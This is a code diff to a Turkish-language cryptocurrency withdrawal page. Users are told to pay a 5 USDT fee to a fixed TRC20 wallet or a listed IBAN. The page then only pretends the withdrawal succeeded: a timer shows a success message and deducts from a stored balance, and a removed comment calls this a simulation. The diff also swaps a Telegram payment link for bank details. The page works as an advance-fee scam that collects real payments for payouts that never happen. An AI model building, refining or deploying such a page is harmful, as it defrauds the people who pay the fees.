@@ -160,7 +160,7 @@
     <div class="balance-box">Bakiye: <span id="balance">0.0000</span> USDT</div>
 
     <input type="text" id="withdrawAddress" placeholder="TRC20 Cüzdan Adresi" autocomplete="off" />
-    <input type="number" id="withdrawAmount" placeholder="Çekilecek Miktar (min 50 USDT)" min="50" step="0.01" />
+    <input type="number" id="withdrawAmount" placeholder="Çekilecek Miktar (min 30 USDT)" min="30" step="0.01" />
 
     <button id="withdrawBtn">Para Çek</button>
 
@@ -220,8 +220,8 @@
         withdrawMessage.textContent = "⚠️ Geçersiz cüzdan adresi!";
         return;
       }
-      if (isNaN(amount) || amount < 50) {
-        withdrawMessage.textContent = "⚠️ Minimum 50 USDT çekebilirsiniz.";
+      if (isNaN(amount) || amount < 30) {
+        withdrawMessage.textContent = "⚠️ Minimum 30 USDT çekebilirsiniz.";
         return;
       }
       if (amount + 8 > balance) {
@@ -231,8 +231,8 @@
 
       withdrawMessage.style.color = "#ffaa00";
       withdrawMessage.innerHTML = `
-        Lütfen 4 USDT işlem ücretini aşağıdaki adrese gönderin:<br><strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong><br><br>
-        veya IBAN ile ödeme yapmak için aşağıdaki butona dokunun:
+        Lütfen 5 USDT işlem ücretini aşağadaki adrese gönderin:<br><strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong><br><br>
+        veya IBAN ile ödeme yapmak için aşağadaki butona dokunun:
       `;
 
       const copyBtn = document.createElement("button");
@@ -244,26 +244,28 @@
       };
       withdrawMessage.appendChild(copyBtn);
 
-      const ibanBtn = document.createElement("a");
-      ibanBtn.href = "https://t.me/rexfinans";
-      ibanBtn.target = "_blank";
-      ibanBtn.textContent = "💳 IBAN ile Öde (Telegram)";
-      ibanBtn.className = "copy-btn";
-      ibanBtn.style.marginLeft = "10px";
-      withdrawMessage.appendChild(ibanBtn);
+      const ibanInfo = document.createElement("div");
+      ibanInfo.style.marginTop = "10px";
+      ibanInfo.innerHTML = `
+        <div style="margin-top: 12px; text-align: left; background: #1e1f2b; padding: 12px; border-radius: 10px;">
+          <b>💳 IBAN:</b> <span id="iban">TR230001002271762072685090</span><br>
+          <b>👤 Alıcı:</b> Paladyum Elektronik Para ve Ödeme Hizmetleri A.Ş.<br>
+          <b>📄 Açıklama:</b> <span id="aciklama">904126059</span><br>
+          <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('iban').textContent)">IBAN Kopyala</button>
+          <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('aciklama').textContent)" style="margin-left:10px">Açıklama Kopyala</button>
+        </div>
+      `;
+      withdrawMessage.appendChild(ibanInfo);
 
-      // Gerçek işlemi simüle et
       setTimeout(() => {
         balance -= (amount + 8);
         updateBalanceDisplay(balance);
         withdrawMessage.style.color = "#55ff55";
         withdrawMessage.innerHTML = `✅ ${amount.toFixed(2)} USDT başarıyla çekildi.\n💸 8 USDT işlem ücreti kesildi.`;
-
         withdrawAmount.value = "";
         withdrawAddress.value = "";
-
         setDoc(doc(db, "balances", userId), { amount: balance });
-      }, 3500);
+      }, 4000);
     };
   </script>
 
